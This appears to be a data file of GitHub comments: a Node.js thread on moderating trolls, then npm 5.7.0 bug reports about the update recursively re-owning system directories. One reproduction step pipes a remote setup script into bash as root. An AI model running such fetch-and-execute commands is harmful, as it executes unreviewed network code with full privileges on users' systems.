4472	"I should say, however, that the process for reviewing contributions does go beyond just making sure the contribution guidelines are followed. There's an art to it. If I see a PR that includes a change that I disagree with, I can choose to respond in a number of ways: (a) I could choose what I believe should come to be known as [The Torvalds Method](http://www.theregister.co.uk/2015/11/01/linus_torvalds_fires_off_angry_compilermasturbation_rant/), (b) I could use [sarcasm](https://en.wikipedia.org/wiki/Reductio_ad_absurdum) to ridicule the basis for the change, (c) or I can take the time to present a logical argument against the change without resorting to either of the previous two options. The choice of response has a definite impact. Further, for any proposed change that I may disagree with, I have to ask myself if there's really any harm in making the change -- even if I think the change is pointless or just ""churn"". _How_ you review a PR is just as important as ensuring that _what_ is being reviewed passes muster.
"
4473	"@jasnell can we move that to the onboarding PR? :)
"
4474	"> or I can take the time to present a logical argument against the change without resorting to either of the previous two options

There's also the case where a reviewer finds the contribution should ""obviously"" not make it in and uses that as the basis for their review, which is almost never true. Maybe something like ""the intention of every review is to educate the contributor through the review process""
"
4475	"Also just noting here that my local goverment had GitHub [banned over IP at ISPs level](https://en.wikipedia.org/wiki/Censorship_of_GitHub#Russia) for several days for the file `suicide.txt` in some repo (well, actually for it's contents).

Things like that _could_ be overdone. To anyone sure that we need a deprecation/removal and one more potential ecosystem breakage over that — please, keep that in mind.

Even soft deprecation means imposing some amount of work over the ecosystem. Is a non-technical reason a good enough excuse for that?

---

**Edit:** to anyone who read the first part incorrectly or did not understand why I mentioned it — that was an example of an unreasonable reaction to solve a minor issue (`suicide.txt` file on a GitHub), causing a bigger one (GitHub outage in a country).

Also, I'm not calling the «suicide» issue negligible, but I hope that it does not worth an immediate ecosystem breakage. 
"
4476	"@isaacs please be consistent with your judgments. https://github.com/nodejs/node/issues/1854#issuecomment-107242008

I'm not trying to upset anyone, but a lack of strict policy on deprecating things, varying procedure of doing so, and the potential ecosystem breakage bothers me.
"
4477	"Folks, `voluntaryExit` is not acceptable as a replacement for `suicide`:

``` javascript
var cluster = require('cluster');

if (cluster.isMaster) {
  cluster.fork()
    .on('exit', function() {
      // this.suicide is false here!
    });
} else {
  process.exit(0);
}
```

The above code is an example of what most humans would regard as a voluntary exit. However, in it the `.suicide` (edit: aka `voluntaryExit`) would be false! Ouch.

I'll kick off this off again with the suggestion of `expectedExit`.
"
4478	"@sam-github Could you also mention that in #3743? That's where the current discussion is located.
"
4479	"Closed via 4f619bde4c20fc46fa3e1b8671ab7174d29f340d

Thanks
"
4480	"cool, post a screenshot next time for context (assuming the post was
removed)

On Thursday, November 12, 2015, James M Snell notifications@github.com
wrote:

> I am temporarily banning Github user installgen2 for making inappropriate
> comments in the nodejs/inclusivity issues. /cc @nodejs/tsc
> https://github.com/orgs/nodejs/teams/tsc
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/TSC/issues/8.
"
4481	"Comment was deleted. Here's the screen grab from my github home page:
<img width=""513"" alt=""ban"" src=""https://cloud.githubusercontent.com/assets/439929/11138435/127aefdc-8977-11e5-9c0e-11ca9453ccbd.png"">
What's a reasonable length of time for banning, btw?
"
4482	"what does IRC typically do @emilyrose?

On Thursday, November 12, 2015, James M Snell notifications@github.com
wrote:

> Comment was deleted. Here's the screen grab from my github home page:
> [image: ban]
> https://cloud.githubusercontent.com/assets/439929/11138435/127aefdc-8977-11e5-9c0e-11ca9453ccbd.png
> What's a reasonable length of time for banning, btw?
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/TSC/issues/8#issuecomment-156315793.
"
4483	"Here's another comment that showed up in that repo. (I deleted it after consulting with @jasnell on IRC about the correct course of action.)

<img width=""805"" alt=""dangerrust"" src=""https://cloud.githubusercontent.com/assets/718899/11146556/3698b186-89c4-11e5-940a-84317ed6afb3.png"">

I think stuff like this is actually a pretty good example of why the consensus on that WG is that there needs to be a way to report these things privately. Posting to a public issue like this one means:
- Potentially rewarding the trolls by drawing attention to their activities
- Marginalized individuals may be reluctant to report harassment in a public forum like this for what I hope are obvious reasons
"
4484	"Can we get a tmp ban on this one too?
"
4485	"I'd say yes. I'm not able to do it at the moment tho.
On Nov 12, 2015 8:57 PM, ""Mikeal Rogers"" notifications@github.com wrote:

> Can we get a tmp ban on this one too?
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/TSC/issues/8#issuecomment-156321523.
"
4486	"As a bit of counterweight, it _is_ a homonym.  I've heard people comment on it before.

As counter-counterweight, the account is only three days old (but with the only other activity a reasonably worded request on the rust-rfc repo.)

Maybe try contacting that individual privately?  Let's not assume malice off the bat.
"
4487	"Honestly when someone does something so clearly intended to be nothing other than a disruption (or worse, triggering) I ban them immediately. 

If they engage me privately in a reasonable discussion on why their behavior was inappropriate we will typically negotiate a reinstatement with the understanding that they're expected to abide by the CoC. 

Sent from my iPhone

> On Nov 12, 2015, at 7:56 PM, Mikeal Rogers notifications@github.com wrote:
> 
> what does IRC typically do @emilyrose?
> 
> On Thursday, November 12, 2015, James M Snell notifications@github.com
> wrote:
> 
> > Comment was deleted. Here's the screen grab from my github home page:
> > [image: ban]
> > https://cloud.githubusercontent.com/assets/439929/11138435/127aefdc-8977-11e5-9c0e-11ca9453ccbd.png
> > What's a reasonable length of time for banning, btw?
> > 
> > ―
> > Reply to this email directly or view it on GitHub
> > https://github.com/nodejs/TSC/issues/8#issuecomment-156315793.
> > 
> > ―
> > Reply to this email directly or view it on GitHub.
"
4488	"@bnoordhuis I think the wording (""quite frankly, brazenly phallic"") makes it impossible that this comment was intended as a serious contribution to the conversation. ""brazenly""? Come on...

I would agree that exact intent is difficult (if not impossible) to discern. Stupid ill-advised joke not intended to harm anyone? Mocking attempt to derail the conversation? Something in between? Who knows?

But I'm also not sure intent matters here. I have no comment (at this time) on whether a temporary block is appropriate or not in these situations other than this:  I would suggest that it not be viewed as a punishment but as a mechanism to prevent abuse similar to the way systems might lock an account for some temporary period of time if there are thousands of failed logins in a short period of time.

(I also wonder if @jasnell and/or I or someone else should block out the usernames on those screenshots. No reason to call attention, positive or negative, to the users in a public forum.)

EDIT: I just updated the screenshot to obscure the username for the second comment. If anyone who doesn't already have it has a legitimate need to know it, I can provide it.
"
4489	"If we don't already, we need a private mailing list similar in nature to
security@nodejs.org to report these matters.
On Nov 13, 2015 4:39 AM, ""Rich Trott"" notifications@github.com wrote:

> @bnoordhuis https://github.com/bnoordhuis I think the wording (""quite
> frankly, brazenly phallic"") makes it impossible that this comment was
> intended as a serious contribution to the conversation. ""brazenly""? Come
> on...
> 
> I would agree that exact intent is difficult (if not impossible) to
> discern. Stupid ill-advised joke not intended to harm anyone? Mocking
> attempt to derail the conversation? Something in between? Who knows?
> 
> But I'm also not sure intent matters here. I have no comment (at this
> time) on whether a temporary block is appropriate or not in these
> situations other than this: I would suggest that it not be viewed as a
> punishment but as a mechanism to prevent abuse similar to the way systems
> might lock an account for some temporary period of time if there are
> thousands of failed logins in a short period of time.
> 
> (I also wonder if @jasnell https://github.com/jasnell and/or I or
> someone else should block out the usernames on those screenshots. No reason
> to call attention, positive or negative, to the users in a public forum.)
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/TSC/issues/8#issuecomment-156422109.
"
4490	"> Maybe try contacting that individual privately? Let's not assume malice off the bat.
> 
> @bnoordhuis I think the wording (""quite frankly, brazenly phallic"") makes it impossible that this comment was intended as a serious contribution to the conversation. ""brazenly""? Come on...

I would also recommend not assuming malice in general; I think everyone has had their ""come on..."" moments, finding out later that there are people who care deeply about a certain subject.

In this particular case, my suspicion is that both accounts may be the same person and I would suggest temp-banning them both. 
- [dangerrust](https://github.com/dangerrust) is clearly a throwaway account, and both accounts are commenting on this issue as well: https://github.com/rust-lang/rfcs/issues/1362#issuecomment-156316201.
- [installgen2](https://github.com/installgen2?tab=repositories) doesn't look like a throwaway, but a lot of things that are in this user's profile & repos look less than professional so it seems like a good idea to have a conversation with said person before letting them comment again.

> If we don't already, we need a private mailing list similar in nature to
> security@nodejs.org to report these matters.

+1
moderation@nodejs.org ?
"
4491	"> lot of things that are in this user's profile & repos look less than professional

I agree. If they feel so strongly about this let them just ask us to be unbanned, though I do not expect responses to improve, at least anytime soon.
"
4492	"How do they ask us? On IRC moderators are known and can be DM'd, what can
we do on GitHub though?

On Friday, November 13, 2015, Jeremiah Senkpiel notifications@github.com
wrote:

> lot of things that are in this user's profile & repos look less than
> professional
> 
> I agree. If they feel so strongly about this let them just ask us to be
> unbanned, though I do not expect responses to improve, at least anytime
> soon.
> 
> —
> Reply to this email directly or view it on GitHub
> https://github.com/nodejs/TSC/issues/8#issuecomment-156462969.
"
4493	"I am a bit on the fence on this one, so let me play devil's advocate. The remark could be seen as an honest observation, if it wasn't for the slight humor added to it. Which makes the intent unclear. It could be observation + pun (passable) or simply a joke for joke sake (troll-like behavior). If anything, we could have called him up on it, and make it clear what's acceptable and what not, and if he persisted on the troll-side then ban him. Wouldn't that be a good exercise in a forum about inclusivity? :smile: 
"
4494	"Would this be a good exercise in inclusivity? No. 

People willing to make ""risky"" comments that may or may not be interpreted as offensive are not the kinds people we are concerned with being inclusive to. 

The people we are concerned with making feel included are the people who are tired of dick jokes LITERALLY FUCKING EVERYWHERE.

This isn't a thought experiment. It's real life, and every moment we spend deliberating on how to creatively address trolls without sending a clear message is a moment we could have been spent proving that we actually care about attracting and retaining awesome people with diverse skills and perspectives. 

STOP BEING SO SCARED OF MODERATING THE COMMUNITY B

Sent from my iPhone

> On Nov 13, 2015, at 8:50 AM, Alexis Campailla notifications@github.com wrote:
> 
> I am a bit on the fence on this one, so let me play devil's advocate. The remark could be seen as an honest observation, if it wasn't for the slight humor added to it. Which makes the intent unclear. It could be observation + pun (passable) or simply a joke for joke sake (troll-like behavior). If anything, we could have called him up on it, and make it clear what's acceptable and what not, and if he persisted on the troll-side then ban him. Wouldn't that be a good exercise in a forum about inclusivity? 
> 
> ―
> Reply to this email directly or view it on GitHub.
"
4495	"He's obviously trolling, and we need to be able to summarily ban people that are obviously trolling. 

Whatever process we land on needs to be able to swiftly bring threads where trolls show up back on track. Any concerns about their comments being miss-interpreted can easily be handled by them having a way to ask to be unbanned and explaining themselves, similar to what we have on IRC.

It's also worth noting that certain conversations are targets for trolls, any conversation in the inclusivity repo being in that category, and the only way to detract from trolls showing up is to moderate them quickly.
"
4496	"> moderation@nodejs.org ?

Rather than a mailing list can we do a private github repo the way we have for security?
"
4497	"The private github repo would not allow reports from individuals who are not currently a part of the nodejs organization.

@emilyrose ... I understand that you feel strongly about this (and you rightfully should) but let's please keep the language professional here -- otherwise we have no right to complain when others use the same language.
"
4498	"Sorry for the caps. I had just woken up and was answering emails on my phone, where there’s no bold or italic button.

I get really tired of seeing hand-wringing over the idea of actually taking moderator action. Nothing is permanent (unless we decide it should be), and the most important aspect of moderation is to eliminate disruption and maintain a safe environment. Removing someone from discussion immediately for any perceived misconduct should be done frequently and without hesitation. Resolution in private is easier on the person in question and more productive than making some giant scene in a public forum where everybody feels compelled to weigh in so they can get their little thumb emoji into the fight. There are fewer egos involved, less reputation is ‘at stake’, and it becomes less likely that the encounter will result in a tailspin.

The more we do to normalize the idea that moderators will take action whenever necessary and sort things out without judgment to those involved, the less fearful everyone will be over the possibility that they may end up being ‘moderated’. It will become a normal part of discourse and people will expect to learn from it and move on.

Thanks for taking the time to read what I have to say about this. It matters a lot to me.

> On Nov 13, 2015, at 9:30 AM, Emily Rose emily@contactvibe.com wrote:
> 
> Would this be a good exercise in inclusivity? No. 
> 
> People willing to make ""risky"" comments that may or may not be interpreted as offensive are not the kinds people we are concerned with being inclusive to. 
> 
> The people we are concerned with making feel included are the people who are tired of dick jokes LITERALLY FUCKING EVERYWHERE.
> 
> This isn't a thought experiment. It's real life, and every moment we spend deliberating on how to creatively address trolls without sending a clear message is a moment we could have been spent proving that we actually care about attracting and retaining awesome people with diverse skills and perspectives. 
> 
> STOP BEING SO SCARED OF MODERATING THE COMMUNITY B
> 
> Sent from my iPhone
> 
> On Nov 13, 2015, at 8:50 AM, Alexis Campailla <notifications@github.com <mailto:notifications@github.com>> wrote:
> 
> > I am a bit on the fence on this one, so let me play devil's advocate. The remark could be seen as an honest observation, if it wasn't for the slight humor added to it. Which makes the intent unclear. It could be observation + pun (passable) or simply a joke for joke sake (troll-like behavior). If anything, we could have called him up on it, and make it clear what's acceptable and what not, and if he persisted on the troll-side then ban him. Wouldn't that be a good exercise in a forum about inclusivity? 
> > 
> > —
> > Reply to this email directly or view it on GitHub https://github.com/nodejs/TSC/issues/8#issuecomment-156485308.
"
4499	"Yep, understood. For me it's not so much a question of _if_ action should be taken but _how_. A moderation email endpoint seems to be the right entry point and a private github repo for tracking and discussing specific incidents would be perfect. Let's get these going today.
"
4500	"I've yet to see someone complain about passionate language (correct me if I'm wrong here).

I haven't directed any aggression at an individual, and my comments have been on topic. If my comments are truly deemed unprofessional please remove me from the mailing list. 

I'm not here to be derailed or listen to tone arguments.

Sent from my iPhone

> On Nov 13, 2015, at 10:02 AM, James M Snell notifications@github.com wrote:
> 
> The private github repo would not allow reports from individuals who are not currently a part of the nodejs organization.
> 
> @emilyrose ... I understand that you feel strongly about this (and you rightfully should) but let's please keep the language professional here -- otherwise we have no right to complain when others use the same language.
> 
> ―
> Reply to this email directly or view it on GitHub.
"
4501	"I have created the _private_ moderation repository (https://github.com/nodejs/moderation) and have limited it to members of the @nodejs/tsc, @nodejs/ctc and @nodejs/inclusivity groups for now. We can use that to track these kinds of issues in the future.
"
4502	"Also, request to create the email endpont: https://github.com/nodejs/email/issues/5
"
4503	"Observations:

A random user has contributed nothing but phallic emoji to an important thread specifically intended to fix the problems we have with inclusivity, and you're all over here discussing whether or not you should implement a **temporary** ban... (dot dot dot)

When the community can see that moderators believe this is a user who deserves to just be let back in after some arbitrary amount of time; **I can see why people feel unsafe in our community.**

Furthermore, when I comment as the only person in this thread who seems to be personally affected by these issues (_incessantly since 2011; ask me for logs if you need proof_), you have the audacity to respond by policing my tone.

We need help.
"
4504	"> temporary ban... (dot dot dot)

Being that we don't have a proper process in place I think James was just being cautious with the ""temporary"" part, while trying to resolve the issue quickly.
"
4505	"i'm here to support @emilyrose as wellas the other women who haven't spoken up.

i think we need to take swift and clear action, and it seems we all agree with that. the specfic implementation will be tricky but im glad we are tackling it head on now.

another note: we need to remember that we need to deal with both the harrassers and the harrassed. it's easy to dive into implementation- thats a naturally tendency devs have. but these actuons hurt our community members and we should also take time to make sure they are doing ok. just acknowledging that goes a long way.
"
4506	"also ugh phone typing. and i cant edit comments in the mobile view. le sigh.
"
4507	"@emilyrose ... Please note that my _first_ actions were to delete the comment and block the user. Only after that did I raise the discussion. Given that I'm not here with the intent of imposing my personal opinion or will on the community, raising the point for discussion seems quite an appropriate action.

And yes, as a matter of respect for everyone, I would appreciate it if we could keep foul language out of the discussion. Thank you.
"
4508	"All the admins are easily contactable. I think banning should be immediate. Both these people have shown by their actions that they are no interested in actively helping the community. 
"
4509	"Removing the tsc-agenda tag. Given that we all seem to be largely in agreement, there seems little reason to discuss on the next TSC call.

I propose making the ban for both accounts permanent. If they wish to object, they can petition the TSC directly.
"
4510	"> All the admins are easily contactable.

Unfortunately not :( The list of owners of this org isn't listed anywhere publicly accessible. One of the things we should fix as we write up the moderation process and fill it with the right people to do moderation.
"
4511	"@mikeal ... in https://github.com/nodejs/email/issues/5 I propose setting up a `report@nodejs.org` mailbox for precisely that purpose. Can we get that going today?
"
4512	"@mikeal that is a good point. Also in general since having a way to email someone in private is a necessary for certain issues. 
"
4513	"I'd just like to say that this whole thing has been quite illuminating. It's now quite clear how little process we have in place to deal with actual violations in even the simplest context. That said, I'm happy with how swiftly the delete/ban happened even in the absence of process.

Let's strive to do better and hopefully move the moderation responsibilities to people best suited to identify harassment rather than falling to the people who happen to be org owners for entirely historic reasons.
"
4514	"For now, it's likely appropriate to close this issue here. We can continue the discussion in the private https://github.com/nodejs/moderation repo.
"
4515	"if this is no longer on the TSC agenda id like to add it to the inclusivity wg agenda, with a plan for bringing it to the TSC whenever the meeting next occurs. 

everyone agrees in principle but we still have a ways to go to make this more effectively and safely enforcable.

thoughts?
"
4516	"@jasnell because moderation is going to be foundation-wide let's keep CTC off that repo and just have the TSC (right now they are the same but that could change in the future).
"
4517	"@ashleygwilliams ... seems reasonable. We should have a blocking/moderation policy in place and documented and that seems like a perfect bit of work for the inclusivity WG. 

@mikeal ... works for me
"
4518	"@ashleygwilliams +1 . The best approach would be to kick off a discussion in the first inclusivity meeting. Once the WG writes up a policy I would send a PR to the `node/TSC` repo with the policy. If there are no objections it will just be merged, if there are objections it'll get the `tsc-agenda` tag and end up in a meeting.
"
4519	"I appreciate that we are making actionable items from this incident. Thank you, everyone. 

As for my ""foul"" language: I will certainly try to curb my enthusiasm but I'm not willing to make promises when it comes to making full use of language to make my point. I have not and will not attack anyone with my words, but if the occasional F-bomb when it's appropriate is really a deal killer then please do remove me from discussions.

Sent from my iPhone

> On Nov 13, 2015, at 11:23 AM, Mikeal Rogers notifications@github.com wrote:
> 
> @ashleygwilliams +1 . The best approach would be to kick off a discussion in the first inclusivity meeting. Once the WG writes up a policy I would send a PR to the node/TSC repo with the policy. If there are no objections it will just be merged, if there are objections it'll get the tsc-agenda tag and end up in a meeting.
> 
> ―
> Reply to this email directly or view it on GitHub.
"
4520	"This thread is pitiful. ""Triggering"", ""Marginalized"", ""Inclusivity"". I thought it was satirical at first. Don't you people have software to write?
"
4521	"I also want to stand up for @emilyrose on the use of foul language. Emily's comments were not directing anger at anyone, and they have every right to be angry. Calling on Emily's use of foul language is a classic case of tone policing. I highly encourage everyone here to read up on tone policing: http://geekfeminism.wikia.com/wiki/Tone_argument, because doing so is bullshit
"
4522	"@jaw-sh This is an open source community project. We have people to work with first and foremost.
"
4523	"I keep seeing the word ""phallic"" being thrown around. How are eggplants phallic?
"
4524	"Recommend that we lock this thread for non-contributors at this point.
"
4525	"+1 on locking
"
4526	"I experienced similar chaos after updating to 5.7.0 in a FreeBSD jail, I noticed recursive ownership of at least /usr/local/etc had been given to the current user:group during the update (`npm update -g`). Thankfully I could rollback to a snapshot of my filesystem from before the update and 5.6.0 works fine again.

As a precaution against potentially catastrophic effects, I hope 5.7.0 will be taken down while a fix is implemented."
4527	This destroyed 3 production server after a single deploy! 
4528	"Same in a docker as root, some command like `npm config set registry` complained about EACCESS error on `/root` dir oO error code return is 7

All worked fine with 5.6 :( "
4529	"I experienced similar issue.
I'm using AWS ec2 (`Amazon Linux AMI 2017.09.1 (HVM), SSD Volume Type - ami-f2d3638a`).
It's clean environment. (Nothing installed.)

After npm v5.7.0 installed, `/usr/bin`'s execution files ownership is updated to `ec2-user:ec2-user` from `root:root`. After the update, I cannot do `sudo`, so I need to re-create EC2 instance.

Here is the commands that reproduces the situation:

on `~ec2-user` directory,


```sh
ls -l /usr/bin
# you can see correct ownership

sudo su
curl --silent --location https://rpm.nodesource.com/setup_6.x | bash -
exit

sudo yum update
sudo yum install git
sudo yum install nodejs
git clone https://github.com/isaacs/npm.git
cd npm
git checkout v5.7.0
make
sudo make install

ls -l /usr/bin
# you can see broken ownership
```

"
4530	Why are you using a pre-release version in production @juggy? Just asking...
4531	Tag doesn't look like pre-release until you actually click on the releases and check the tag. If it's a pre-release tag, I suggest to not format the tag in a way it looks like it could not be a pre-release tag.
4532	I suggest to do no publish pre-release version announcement on the official blog: http://blog.npmjs.org/post/171139955345/v570
4533	"> I suggest to do no publish pre-release version announcement on the official blog: http://blog.npmjs.org/post/171139955345/v570

...which doesn't mention it's a pre-release in any way, shape or form."
4534	"Pre-releases is `alpha`, `beta`, `rc`, `pre`, etc. …

`5.7.0` looks like minor stable release."
4535	lol
4536	Sorry people, wasn’t meant to be rude 🙄
4537	npm 5.7.0 on Mac not worked
4538	@towc welp, missed that 🆗 
4539	haha )) can someone prove that this update does destroy production servers ?
4540	Oh yes
4541	"Doc link
https://docs.npmjs.com/getting-started/fixing-npm-permissions"
4542	Mind staying on topic, rather than enforcing your opinion on us for an unrelated subject? Thanks!
4543	"<details>
<summary>Interesting 🤔</summary>

https://github.com/npm/npm/blob/d3095ff20b8ea01e7fbf93a4a697a04fea77d8e6/lib/utils/correct-mkdir.js#L31

</details>"
4544	"I think it would be preferable to only explicitly set permissions on folders that actually will be created by npm instead of just tinkering with the existing folders, especially when that code is accessing critical folders as the root user (through `sudo`). In the worst case, this renders systems unbootable and/or unusable.

On another note, it is indeed confusing to just use `v5.7.0` as a pre-release version name despite the pre-release marker on GitHub. Or is the routine to mark upcoming releases as pre-releases and then just switching them over to stable release as-is?"
4545	🍿
4546	consider reading [this](https://pawelgrzybek.com/fix-priviliges-and-never-again-use-sudo-with-npm/)
4547	Playing a dangerous game by doing a minor stable release that's actually a `pre`. 
4548	Things like this are like a :eggplant: in the face of npm and node. And I love it.
4549	"For the people asking ""why is 5.7.0 a prerelease released as stable"", it's not:

```
{ latest: '5.6.0',
     next: '5.7.0'
```

It's tagged as next, so if you got it you either explicitly installed that version knowing it's marked as next, or you installed @next.

Release channels exist for a reason. If you're running ""next"" on production environments you're asking for trouble."
4550	"If what he's saying is correct, the pre-release appears to be pushed to the Arch main repositories, so if you're on Arch, beware! I've uninstalled npm and nodejs from my Arch box for the moment just to prevent any extra *fun* until this bug is fixed.

EDIT: it appears I misread his steps to recreate. Updating npm from npm is what installed the 5.7.0 version. Still bad, but not related to Arch's repositories."
4551	"![image](https://user-images.githubusercontent.com/927220/36540911-28b85bc2-17aa-11e8-9597-d9d48ceab7a6.png)
"
4552	"@trodrigues might be still worth writing about this more explicitly on the blog post. Nobody coming to the site would know from reading it that it's a pre-release at the time.

Edit: for clarity, I'm referring to this: http://blog.npmjs.org/post/171139955345/v570"
4553	I ran `npm update -g` this morning and my local npm 5.6.0 was upgraded to 5.7.0 so in some way, it must have gone beyond a pre-release.
4554	"Generally in projects that follow semver I expect pre-release packages to have some string suffixed to the version number such as `5.7.0-next`.

This is only listed as a `MAY` in the spec but it does allow you to immediately tell if a release is considered stable or not just from the version number."
4555	"> If what he's saying is correct, the pre-release appears to be pushed to the Arch main repositories, so if you're on Arch, beware!

I don't know where you see that, but it's [not the case](https://git.archlinux.org/svntogit/community.git/log/trunk?h=packages/npm)."
4556	"@catwell from OP's steps to recreate. OP may not have included all the details.

Indeed, it looks like OP must have some other config. I don't see it in any of Arch's main repositories."
4557	"@elliotd123 
Sure it was pushed to the arch repos?
https://git.archlinux.org/svntogit/community.git/log/trunk?h=packages/npm  seems to indicate otherwise."
4558	"@mastertinner reported the `update installs newest than latest` in https://github.com/npm/npm/issues/19888

`npm update` and `npm outdated` for some reason manage to report newer versions than `latest` which they should not.

Tagging as pre-release (and as @next on the registry) is semver compliant so its a non-issue."
4559	Maybe it would be good to pull back the release for now? If such a thing is possible.
4560	See also https://github.com/npm/npm/issues/9359: npm has been changing permissions in critical directories for **a long time**. This issue was wrongly autoclosed.
4561	OK, @petetnt actually meant #19888, so ending up having 5.7.0 is not Arch-specific, it is related to using npm to update npm...
4562	@lutzhorn because of their weird auto closing policy, a security contact confirmed the problem with that but nobody though it would be a good idea to open the bugreport :man_shrugging: 
4563	@anthraxx Didn't notice this. Even worse :(
4564	"@elliotd123 all details to reproduce the bug were included and confirmed by other users experiencing the same issue on non-Arch platforms. This isn't isolated to a specific configuration file or distribution as far as I'm aware.

Just mopping up my tears whilst reinstalling Arch for the 3rd time this month."
4565	"*laughs in Windows*

Yikes."
4566	"*laughs in Windows*

Yikes."
4567	"Seriously, undo the tag! And use semver to mark pre-release, not just GH release...
And sysadmins: verify prior upgrading blindly, specially to a new release, either major or minor."
4568	Today is gonna be a fun day. I won't have had this many calls since Spectre/Meltdown.  Thanks! 🙄
4569	Just wondering, @Crunkle: Why did you install both Node and NPM from the Arch repos? AFAIK, installing programming languages/package managers binaries from a distro's repos is a **really bad** idea, especially when it comes to permissions.
4570	@aitbw Uhmm, no.
4571	"> If what he's saying is correct, the pre-release appears to be pushed to the Arch main repositories, so if you're on Arch, beware! I've uninstalled npm and nodejs from my Arch box for the moment just to prevent any extra fun until this bug is fixed.

I challenge your bizarre assumption: https://www.archlinux.org/packages/community/any/npm/

This is not something difficult to check, please don't spread FUD. As the OP said:

> I am personally using Arch Linux with the latest npm package, installed as the root user via:
> 
> pacman -Sy npm nodejs
> npm install -g npm
> npm install -g semver

"
4572	"@aitbw 
Installing programming language specific package managers is a really bad idea no matter how you install them."
4573	"For what it's worth, running `npm update -g npm` installed the broken 5.7.0 pre-release, while `npm install -g npm` downgraded to the working 5.6.0. Unsure if this is intended behavior:

<img width=""1130"" alt=""screen shot 2018-02-22 at 8 59 13 am"" src=""https://user-images.githubusercontent.com/2061559/36542646-621a4b5a-17af-11e8-82d3-856a6b04af91.png"">
"
4574	"> @aitbw Uhmm, no.

Could you elaborate further on that, @dos1?

> @aitbw Installing programming language specific package managers is a really bad idea no matter how you install them.

How so, @Tsutsukakushi?"
4575	"NPM socks 

![npm socks](https://i.imgur.com/0KhLcdn.jpg)"
4576	please adhere to [Semantic Versioning](https://semver.org/). `x.y.z` being a pre-release is not acceptable
4577	"@aitbw The job of system-wide package manager is to manage your applications; language-specific package managers included. There are no issues with Cargo, pip, Maven, RubyGems or others when installed from repositories.

You have maybe mistaken it with mixing globally installed packages managed by system-wide manager with ones from lang-specific manager. You should use either one or another, and usually it's in favour of system-wide packager unless you need to globally install some cutting-edge stuff."
4578	Just do a 5.7.0-rc1 would be much better
4579	Maybe that was my confusion @dos1, thanks for the clarification.
4580	"> Just wondering, @Crunkle: Why did you install both Node and NPM from the Arch repos? AFAIK, installing programming languages/package managers binaries from a distro's repos is a really bad idea, especially when it comes to permissions.

Screwing with directory permissions is a really bad idea.

And blaming your stupid mistakes on others also."
4581	"Can we stop blaming the victims of this issue that simply ran `npm update`?
Not only was this `pre` release pushed up stream, but it was also marked as a normal SEMVER minor stable release."
4582	this can also introduce a **SECURITY HOLE** in the system.. if you have an authorized SETUID/SETGID executable that is not owned by root, it will become so introducing an unexpected attack vector for privesc. be careful of the side effects of an arbitrary `chmod -R root:root` command.
4583	:shipit: 
4584	"@aitbw, keep in mind that application-specific package managers are in fact used to build distro packages. npm, cargo, pip (or setuptools, depending on whether an actual source package even exists), rubygems, and others, are also the build systems used to install packages from tarballs to some --root=""$staging_root_directory"".

This is complicated further by the fact that npm is a runtime dependency, not just something used for installation purposes.
(Similar logic applies to python setuptools, depending on whether the package installs any scripts in `/usr/bin`)"
4585	Having a system test on a few docker images and checking if they are bootable post install could be an automated way to prevent a similar disaster in the future, but that might be a bit of an overreaction.
4586	The only thing system package managers do to language package managers (on Ubuntu, and Debian) is either patch them against known bugs, or force them to follow FHS, and obvious location policies.  Exp for RubyGems, Debian forces it to install bins in /usr/local/bin... not /usr/bin, because you're the one installing the packages.  It does the same for npm.
4587	@ignasg At this rate it's not an overreaction to ensure NPM isn't breaking anything post install. I think that's normal CI 📦 
4588	"@ignasg that sounds like a regular integration test to me, nothing necessarily overreacting. However, docker is very unsuitable for this since it doesn't ""boot"" things, you'd want to use vagrant or similar with a classic VM that actually runs a full system to test this."
4589	"wtf. a package manager should NEVER touch permissions / ownership of files / directories it does not own. and it is obvious that if a directory already exists - npm does not own it! 
"
4590	@stefansaraev ... unless it has been created by an earlier run by npm. Things aren't that simple sometimes. Also this is obviously a bug, it wasn't meant to change permissions for the affected system directories - so it's not like this was intentional.
4591	Integration tests, whether docker, or otherwise, will do *nothing*. Even when we report bugs like #9359 they don't get fixed, so why would automated reports be any more likely to be fixed?
4592	Use [yarn](https://yarnpkg.com) instead 😛 
4593	"> And blaming your stupid mistakes on others also.

I was just asking a simple question based on what I know, no need to call others `stupid`, geez.

> @aitbw, keep in mind that application-specific package managers are in fact used to build distro packages. npm, cargo, pip (or setuptools, depending on whether an actual source package even exists), rubygems, and others, are also the build systems used to install packages from tarballs to some --root=""$staging_root_directory"".

Thanks @eli-schwartz :ok_hand:

"
4594	">Integration tests, whether docker, or otherwise, will do nothing. Even when we report bugs like #9359 they don't get fixed, so why would automated reports be any more likely to be fixed?

@eli-schwartz  yeah its best not to report any bug of any kind thanks man!"
4595	"![kitty](https://user-images.githubusercontent.com/6559007/36544997-ded75b82-17b5-11e8-8367-8ad304889083.jpg)
"
4596	"> This thread

![x](https://pixel.nymag.com/imgs/daily/selectall/2016/10/20/20-dumpster-fire.w710.h473.2x.gif)"
4597	I guess #19829 can be marked as a duplicate then?
4598	"> @eli-schwartz yeah its best not to report any bug of any kind thanks man!

Well, obviously we will continue to report bugs. Allowing this sort of disaster to get onto users' systems is not okay, and we want that to be fixed.

I just don't think saying ""oh, make a docker test"" is some magic bullet that will fix things, as though knowing the issue exists is all it takes to get npm developers to fix it. The root of the issue is that npm needs an attitude fix.

Also, having an open upstream bug is something we need for documentation purposes, so we can keep track of why our build scripts contain e.g.

```
# non-deterministic race in npm gives 777 permissions to random directories
# see https://github.com/npm/npm/issues/9359
find ""$pkgdir/usr"" -type d -exec chmod 755 '{}' +
```

and remove those workarounds in the increasingly unlikely event that this ever gets fixed."
4599	"This isn't a bug, this is all working exactly as written and intended. There's a correctMkdir function that [explicitly](https://github.com/npm/npm/blob/d3095ff20b8ea01e7fbf93a4a697a04fea77d8e6/lib/utils/correct-mkdir.js#L55) uses the sudo caller (not the effective or real user ID) to [recursively](https://github.com/npm/npm/blob/d3095ff20b8ea01e7fbf93a4a697a04fea77d8e6/lib/utils/correct-mkdir.js#L119) chown any directory it is called to, and then this function is used [all over the place](https://github.com/npm/npm/search?utf8=%E2%9C%93&q=correctMkdir&type=), notably in places like the installation [etc](https://github.com/npm/npm/blob/d3095ff20b8ea01e7fbf93a4a697a04fea77d8e6/lib/config/core.js#L156) directory.

